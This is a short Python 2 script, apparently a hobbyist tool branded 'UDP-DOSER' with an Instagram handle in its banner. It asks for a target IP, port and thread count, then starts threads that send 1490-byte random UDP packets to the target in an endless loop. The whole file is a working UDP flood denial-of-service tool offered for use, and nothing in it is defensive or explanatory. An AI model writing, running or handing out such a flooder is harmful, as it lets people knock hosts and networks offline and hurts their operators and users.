import sys
import os
import time
import socket
import random
import threading

print ("\033[31m   __  _____  ___      ___  ____  ___________ \033[0m")
print ("\033[31m  / / / / _ \/ _ \____/ _ \/ __ \/ __/ __/ _ \ \033[0m")
print ("\033[31m / /_/ / // / ___/___/ // / /_/ /\ \/ _// , _/ \033[0m")
print ("\033[31m \____/____/_/      /____/\____/___/___/_/|_| \033[0m")
print ("\033[33m                      Instagram : @bossy.078 \033[0m")

print (" ")
ip = raw_input("\033[93m [+] IP : \033[1m")
port = input("\033[94m [+] Port : \033[1m")
thread_num = input("\033[95m [+] Threads : \033[1m")
print (" ")
print "\033[91m [!] Please Wait While Packages Are Preparing Thread : \033[1m",thread_num
time.sleep(5)

def run():
	bytes = random._urandom(1490)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			s.connect((str(ip),int(port))) 
			s.send(bytes)
			print "\033[94m",time.ctime(time.time()),"\033[0m \033[92m [+] Package Sent ! \033[0m"
		except:
			s.close()
			print "\033[94m",time.ctime(time.time()),"\033[0m \033[91m [!] Error , Socket Closed \033[0m"
			
for i in range(thread_num):
    th = threading.Thread(target = run)
    th.start()
